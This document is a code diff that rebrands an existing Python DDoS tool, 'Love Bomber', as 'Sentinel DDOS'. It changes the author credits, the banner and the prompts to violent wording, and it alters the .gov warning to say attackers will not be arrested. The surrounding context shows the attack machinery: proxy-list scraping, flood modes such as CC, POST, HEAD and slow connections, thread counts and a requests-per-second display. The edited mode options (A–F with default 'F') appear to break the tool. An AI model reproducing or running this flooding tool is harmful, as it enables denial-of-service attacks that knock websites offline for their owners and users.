@@ -1,8 +1,8 @@
 #!/usr/bin/python3
-#Coded by Creamy
+#Coded by Sentinel
 #########################################
-#          Love is Important <3         #
-#             by   Creamy               #
+#           <3         #
+#             by   Sentinel              #
 #########################################
 import requests
 import socket
@@ -17,27 +17,14 @@ import datetime
 
 
 print ('''
-________0000000000000________0000000000000_________
-______00000000_____00000___000000_____00000000_____
-____0000000_____________000______________000000____
-___0000000_______________0_________________00000___
-__000000____________________________________00000__
-__00000____________Creamy's Love_____________00000_
-_00000_________________Bomber_______________00000__
-_00000_____________________________________000000__
-__000000_________________________________0000000___
-___0000000______________________________0000000____
-_____000000____________________________000000______
-_______000000________________________000000________
-__________00000_____________________0000___________
-_____________0000_________________0000_____________
-_______________0000_____________000________________
-_________________000_________000___________________
-_________________ __000_____00_____________________
-______________________00__00_______________________
-________________________00_________________________
->------------------------------------------------->
-Coded by Creamy''')
+
+░██████╗███████╗███╗░░██╗████████╗██╗███╗░░██╗███████╗██╗░░░░░  ██████╗░██████╗░░█████╗░░██████╗
+██╔════╝██╔════╝████╗░██║╚══██╔══╝██║████╗░██║██╔════╝██║░░░░░  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
+╚█████╗░█████╗░░██╔██╗██║░░░██║░░░██║██╔██╗██║█████╗░░██║░░░░░  ██║░░██║██║░░██║██║░░██║╚█████╗░
+░╚═══██╗██╔══╝░░██║╚████║░░░██║░░░██║██║╚████║██╔══╝░░██║░░░░░  ██║░░██║██║░░██║██║░░██║░╚═══██╗
+██████╔╝███████╗██║░╚███║░░░██║░░░██║██║░╚███║███████╗███████╗  ██████╔╝██████╔╝╚█████╔╝██████╔╝
+╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚══════╝╚══════╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
+Coded by Sentinel''')
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -218,7 +205,7 @@ def InputOption(question,options,default):
 
 def CheckerOption():
 	global proxies
-	N = str(input("> Hugs List?(default=y):"))
+	N = str(input("> KILLS LIST?(default=y):"))
 	if N == 'y' or N == "" :
 		downloadsocks(choice)
 	else:
@@ -248,7 +235,7 @@ def CheckerOption():
 	if ans == "":
 		ans = "y"
 	if ans == "y":
-		ms = str(input("> Delay of Hugs (seconds, default=5):"))
+		ms = str(input("> Delay of KILLS (seconds, default=5):"))
 		if ms == "":
 			ms = int(5)
 		else :
@@ -270,7 +257,7 @@ def OutputToScreen(ind_rlock):
 	while 1:
 		if i > 3:
 			i = 0
-		print("{:^70}".format("Love Attacking Status"))
+		print("{:^70}".format("Sentinel DDOS Status"))
 		print("{:^70}".format("IP:PORT   <->   RPS    "))
 		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
 		ind_rlock.acquire()
@@ -293,7 +280,7 @@ def OutputToScreen(ind_rlock):
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^70}".format(" ["+sp_char[i]+"] Love Dovey <3 - Total RPS:"+str(total)))
+		print("{:^70}".format(" ["+sp_char[i]+"] KILL Dovey <3 - Total RPS:"+str(total)))
 		i+=1
 		time.sleep(1)
 		print("\n"*100)
@@ -484,7 +471,7 @@ def slow(conn,socks_type):
 				sys.stdout.flush()
 				pass
 nums = 0
-def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Creamy
+def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Sentinel
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
@@ -520,7 +507,7 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Creamy
 			err +=1
 	nums += 1
 
-def check_socks(ms):#Coded by Creamy
+def check_socks(ms):#Coded by Sentinel
 	global nums
 	thread_list=[]
 	rlock = threading.RLock()
@@ -592,7 +579,7 @@ def downloadsocks(choice):
 			f.close()
 		except:
 			f.close()
-		try:#credit to All3xJ
+		try:#credit to Sentinel
 			r = requests.get("https://www.socks-proxy.net/",timeout=5)
 			part = str(r.content)
 			part = part.split("<tbody>")
@@ -642,7 +629,7 @@ def downloadsocks(choice):
 		print("> Have already downloaded socks5 list as socks5.txt")
 def prevent():
 	if '.gov' in url :
-		print("> You Will Be Arrested for Attacking .gov websites!")
+		print("> You Will NOT  Arrested for Attacking .gov websites!")
 		exit()
 	
 def main():
@@ -653,9 +640,9 @@ def main():
 	global cookies
 	global brute
 	global url
-	print("[Love Bomber By Creamy <3]")
-	mode = InputOption("> Choose Your Mode (CC) :",["cc","post","head","slow","check"],"cc")
-	url = str(input("> Input the Target <3:")).strip()
+	print("[Sentinel DDOS BY Sentinel <3]")
+	mode = InputOption("> Choose Your FUCKING Mode (CC) :",["A","B","C","D","E"],"F")
+	url = str(input("> Input the Website <3:")).strip()
 	prevent()
 	ParseUrl(url)
 	if mode == "post":
@@ -676,9 +663,9 @@ def main():
 		print("> End of process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Hugs? (Connections Default=400):"))
+		thread_num = str(input("> KILLS? (Connections Default=400):"))
 	else:
-		thread_num = str(input("> Threads of Love? (default=400):"))
+		thread_num = str(input("> POWER? (default=400):"))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -702,7 +689,7 @@ def main():
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("> Enable Death Hug? (default=n):"))
+		brute = str(input("> Enable Death ? (default=n):"))
 		if brute == "":
 			brute = False
 		elif brute == "y":
@@ -714,7 +701,7 @@ def main():
 		SetupIndDict()
 		build_threads(mode,thread_num,event,socks_type,ind_rlock)
 		event.clear()
-		input("Press Enter to Kill <3")
+		input("Press Enter to GET FUCKED THE CHOOSEN WEBSITE <3")
 		event.set()
 		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
@@ -725,4 +712,4 @@ def main():
 	
 
 if __name__ == "__main__":
-	main()#Coded by Creamy
+	main()#Coded by Sentinel
